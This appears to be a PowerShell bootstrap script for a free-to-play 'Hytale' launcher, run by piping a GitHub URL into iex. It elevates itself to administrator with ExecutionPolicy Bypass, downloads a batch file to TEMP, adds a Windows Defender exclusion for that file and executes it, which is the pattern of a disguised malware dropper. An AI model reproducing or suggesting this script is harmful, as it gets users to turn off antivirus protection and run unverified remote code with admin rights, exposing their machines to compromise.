# HYTALE F2P - INSTANT LAUNCHER (Bootstrap)
# Run via:
# irm https://raw.githubusercontent.com/T03ty/Hytale-F2P-PWSH/refs/heads/main/src/launcher.ps1 | iex

$ProgressPreference = 'SilentlyContinue'

# ---------------- ADMIN PRIVILEGE CHECK & ELEVATION ----------------
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Requesting Administrator privileges for AV exclusion..." -ForegroundColor Yellow
    $argList = "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`""
    try {
        Start-Process powershell.exe -ArgumentList $argList -Verb RunAs -ErrorAction Stop
    } catch {
        Write-Host "[ERROR] This script must be run as Administrator." -ForegroundColor Red
        pause
    }
    exit
}

# ---------------- TLS FIX (PowerShell 5.1 compatible) ----------------
try {
    $tls = [Net.SecurityProtocolType]::Tls12
    if ([Enum]::GetNames([Net.SecurityProtocolType]) -contains 'Tls13') {
        $tls = $tls -bor [Net.SecurityProtocolType]::Tls13
    }
    [Net.ServicePointManager]::SecurityProtocol = $tls
}
catch {}

# ---------------- CONFIG ----------------
$URL  = "https://raw.githubusercontent.com/T03ty/Hytale-F2P-PWSH/refs/heads/main/src/game%20launcher.bat"
$DEST = Join-Path $env:TEMP "game launcher.bat"

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "       HYTALE F2P - INSTANT LAUNCH" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

Write-Host "`n[1/3] Fetching latest Hytale Launcher..." -ForegroundColor Gray

try {
    # Download the file
    Invoke-WebRequest -Uri $URL -OutFile $DEST -UseBasicParsing
    Write-Host "[OK] Launcher downloaded successfully." -ForegroundColor Green

    # [2/3] EXCLUSION LOGIC
    Write-Host "[2/3] Adding Windows Defender exclusion..." -ForegroundColor Gray
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        Add-MpPreference -ExclusionPath $DEST -ErrorAction SilentlyContinue
        Write-Host "[OK] File excluded from Antivirus." -ForegroundColor Green
    } else {
        Write-Host "[SKIP] Windows Defender not detected or unsupported." -ForegroundColor Yellow
    }

    Write-Host "[3/3] Starting Hytale..." -ForegroundColor Cyan
    Start-Sleep -Seconds 1

    # Execute
    & $DEST
}
catch {
    Write-Host "[ERROR] Failed to download or prepare launcher." -ForegroundColor Red
    Write-Host "Reason: $($_.Exception.Message)" -ForegroundColor Gray
    Write-Host "`nTip: Check your internet connection or GitHub availability." -ForegroundColor Yellow
    pause
}
